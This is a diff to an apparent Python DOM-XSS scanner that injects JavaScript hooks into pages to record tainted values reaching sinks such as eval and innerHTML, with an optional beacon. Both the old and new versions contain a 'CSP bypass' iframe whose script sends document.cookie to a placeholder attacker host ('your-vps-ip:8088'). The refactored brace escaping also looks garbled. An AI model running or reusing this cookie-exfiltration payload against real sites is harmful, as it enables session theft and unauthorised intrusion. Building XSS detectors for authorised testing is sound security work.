@@ -114,9 +114,9 @@ RATE_LIMIT_SLEEP = 0.05
 SESSION_SPLICE_MS= 100
 JITTER_MIN_MS    = 20
 JITTER_MAX_MS    = 200
-VERIFY_TIMEOUT   = 45000
+VERIFY_TIMEOUT   = 3000
 HTTP_TIMEOUT     = 12
-HEADLESS_WAIT    = 3500
+HEADLESS_WAIT    = 3000
 
 # Shared HTTP session
 SESSION = requests.Session()
@@ -397,99 +397,135 @@ class DomXssAnalyzer:
 
         # Inject XSS detection hooks
         await self.page.context.add_init_script(f"""
-            (() => {{
-                if (!window.__xss_hits) window.__xss_hits = [];
-                const SS = {json.dumps(self.SNIFF_SOURCES)};
-                const PAYLOADS = {json.dumps(BASE_PAYLOADS + EXTRA_BASE)};
+        (() => {{
+            const XSS_SOURCES = {json.dumps(BASE_PAYLOADS + EXTRA_BASE)};
+            const SS          = {json.dumps(self.SNIFF_SOURCES)};
+            const PAYLOADS    = {json.dumps(BASE_PAYLOADS + EXTRA_BASE)};            
 
-                function isTainted(v) {{
-                    return SS.some(src => v && v.includes(src)) ||
-                        PAYLOADS.some(p => v && v.includes(p));
-                }}
+            // Storage for findings
+            window._dom_xss_found = [];
+            window.__xss_hits = [];
 
-                function record(sink, payload, elem, attr) {{
-                    const payloadType = PAYLOADS.find(p => payload.includes(p)) || 'custom';
-                    const stack = new Error().stack.split('\n').slice(2).join('\n');
-                    const info = {{
-                        page: location.href,
-                        sink,
-                        payload,
-                        payloadType,
-                        tag: elem?.tagName,
-                        id: elem?.id,
-                        cls: elem?.className,
-                        attr,
-                        stack,
-                        timestamp: Date.now()
-                    }};
-                    window.__xss_hits.push(info);
-                    console.error("[XSS]", info);
-                    {f"""
-                    fetch("{self.beacon}", {{
-                        method: "POST",
-                        keepalive: true,
-                        headers: {{ "Content-Type": "application/json" }},
-                        body: JSON.stringify(info)
-                    }}).catch(e => console.error('Beacon failed:', e));""" if self.beacon else ""}
-                }}
+            // Unified taint check
+            const isTainted = v => (
+                XSS_SOURCES.some(src => v && v.includes(src)) ||
+                SS.some(src => v && v.includes(src)) ||
+                PAYLOADS.some(p => v && v.includes(p))
+            );
 
-                const hooks = [
-                    {{ obj: window, prop: 'eval', name: 'eval' }},
-                    {{ obj: window, prop: 'Function', name: 'Function' }},
-                    {{ obj: window, prop: 'setTimeout', name: 'setTimeout' }},
-                    {{ obj: window, prop: 'setInterval', name: 'setInterval' }},
-                    {{ obj: Element.prototype, prop: 'innerHTML', name: 'innerHTML' }},
-                    {{ obj: Element.prototype, prop: 'outerHTML', name: 'outerHTML' }},
-                    {{ obj: Document.prototype, prop: 'write', name: 'document.write' }},
-                    {{ obj: Document.prototype, prop: 'writeln', name: 'document.writeln' }},
-                    {{ obj: Element.prototype, prop: 'src', name: 'element.src' }},
-                    {{ obj: HTMLAnchorElement.prototype, prop: 'href', name: 'a.href' }},
-                    {{ obj: HTMLScriptElement.prototype, prop: 'src', name: 'script.src' }},
-                    {{ obj: HTMLIFrameElement.prototype, prop: 'src', name: 'iframe.src' }},
-                    {{ obj: Location.prototype, prop: 'href', name: 'location.href' }},
-                    {{ obj: Location.prototype, prop: 'assign', name: 'location.assign' }},
-                    {{ obj: Location.prototype, prop: 'replace', name: 'location.replace' }}
-                ];
-
-                // Escape braces to prevent Python f-string interpolation
-                hooks.forEach(({{{{obj, prop, name}}}}) => {{
-                    const original = obj[prop];
-                    obj[prop] = function(...args) {{
-                        const val = args[0];
-                        if (isTainted(val)) record(name, val, this, prop);
-                        return original.apply(this, args);
-                    }};
-                }});
-
-                const realSetAttr = Element.prototype.setAttribute;
-                Element.prototype.setAttribute = function(name, value) {{
-                    if (isTainted(value)) record("setAttribute", value, this, name);
-                    return realSetAttr.call(this, name, value);
+            // Record function for full XSS tracking
+            function record(sink, payload, elem, attr) {{
+                const payloadType = PAYLOADS.find(p => payload.includes(p)) || 'custom';
+                const stack = new Error().stack.split('\\n').slice(2).join('\\n');
+                const info = {{
+                    page: location.href,
+                    sink,
+                    payload,
+                    payloadType,
+                    tag: elem?.tagName,
+                    id: elem?.id,
+                    cls: elem?.className,
+                    attr,
+                    stack,
+                    timestamp: Date.now()
                 }};
+                window.__xss_hits.push(info);
+                console.error("[XSS]", info);
+                {f"""
+                fetch("{self.beacon}", {{
+                    method: "POST",
+                    keepalive: true,
+                    headers: {{ "Content-Type": "application/json" }},
+                    body: JSON.stringify(info)
+                }}).catch(e => console.error('Beacon failed:', e));
+                """ if self.beacon else ""}
+            }}
 
-                const realAC = Node.prototype.appendChild;
-                Node.prototype.appendChild = function(node) {{
-                    if (node instanceof Text && isTainted(node.data))
-                        record("appendChild(Text)", node.data, this.parentElement, null);
-                    return realAC.call(this, node);
-                }};
+            // Hook eval
+            const origEval = window.eval;
+            window.eval = function(payload) {{
+                if (isTainted(payload)) {{
+                    window._dom_xss_found.push({{ sink:'eval', payload }});
+                    console.warn('[DOM-XSS] eval →', payload);
+                    record('eval', payload, null, null);
+                }}
+                return origEval.call(this, payload);
+            }};
 
-                const wsSendOrig = WebSocket.prototype.send;
-                WebSocket.prototype.send = function(data) {{
-                    if (typeof data === 'string' && isTainted(data)) {{
-                        record("WebSocket.send", data, null);
+            // Hook innerHTML
+            const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
+            Object.defineProperty(Element.prototype, 'innerHTML', {{
+                set(val) {{
+                    if (isTainted(val)) {{
+                        window._dom_xss_found.push({{ sink:'innerHTML', payload: val }});
+                        console.warn('[DOM-XSS] innerHTML →', val);
+                        record('innerHTML', val, this, 'innerHTML');
                     }}
-                    return wsSendOrig.apply(this, arguments);
-                }};
+                    return desc.set.call(this, val);
+                }}
+            }});
 
-                // Optional CSP bypass using srcdoc
-                try {{
-                    const iframe = document.createElement("iframe");
-                    iframe.srcdoc = `<script>fetch('http://your-vps-ip:8088/csp?c='+document.cookie)</script>`;
-                    document.body.appendChild(iframe);
-                }} catch (e) {{}}
-            }})();
+            // Generic hooks
+            const hooks = [
+                {{{{ obj: window, prop: 'Function', name: 'Function' }}}},
+                {{{{ obj: window, prop: 'setTimeout', name: 'setTimeout' }}}},
+                {{{{ obj: window, prop: 'setInterval', name: 'setInterval' }}}},
+                {{{{ obj: Element.prototype, prop: 'outerHTML', name: 'outerHTML' }}}},
+                {{{{ obj: Document.prototype, prop: 'write', name: 'document.write' }}}},
+                {{{{ obj: Document.prototype, prop: 'writeln', name: 'document.writeln' }}}},
+                {{{{ obj: Element.prototype, prop: 'src', name: 'element.src' }}}},
+                {{{{ obj: HTMLAnchorElement.prototype, prop: 'href', name: 'a.href' }}}},
+                {{{{ obj: HTMLScriptElement.prototype, prop: 'src', name: 'script.src' }}}},
+                {{{{ obj: HTMLIFrameElement.prototype, prop: 'src', name: 'iframe.src' }}}},
+                {{{{ obj: Location.prototype, prop: 'href', name: 'location.href' }}}},
+                {{{{ obj: Location.prototype, prop: 'assign', name: 'location.assign' }}}},
+                {{{{ obj: Location.prototype, prop: 'replace', name: 'location.replace' }}}}
+            ];
+
+            hooks.forEach(({{{{obj, prop, name}}}}) => {{{{
+                const original = obj[prop];
+                obj[prop] = function(...args) {{{{
+                    const val = args[0];
+                    if (isTainted(val)) record(name, val, this, prop);
+                    return original.apply(this, args);
+                }}}};
+            }}}});
+
+            // setAttribute hook
+            const realSetAttr = Element.prototype.setAttribute;
+            Element.prototype.setAttribute = function(name, value) {{
+                if (isTainted(value)) record('setAttribute', value, this, name);
+                return realSetAttr.call(this, name, value);
+            }};
+
+            // appendChild hook
+            const realAppend = Node.prototype.appendChild;
+            Node.prototype.appendChild = function(node) {{
+                if (node instanceof Text && isTainted(node.data)) {{
+                    record('appendChild(Text)', node.data, this.parentElement, null);
+                }}
+                return realAppend.call(this, node);
+            }};
+
+            // WebSocket hook
+            const wsSendOrig = WebSocket.prototype.send;
+            WebSocket.prototype.send = function(data) {{
+                if (typeof data === 'string' && isTainted(data)) {{
+                    record('WebSocket.send', data, null, null);
+                }}
+                return wsSendOrig.apply(this, arguments);
+            }};
+
+            // Optional CSP bypass
+            try {{
+                const iframe = document.createElement('iframe');
+                iframe.srcdoc = `<script>fetch('http://your-vps-ip:8088/csp?c='+document.cookie)</script>`;
+                document.body.appendChild(iframe);
+            }} catch (e) {{ }}
+
+        }})();
         """)
+
 
         # Reload and trigger hooks
         canary = "XSS_CANARY_" + randstr(6)
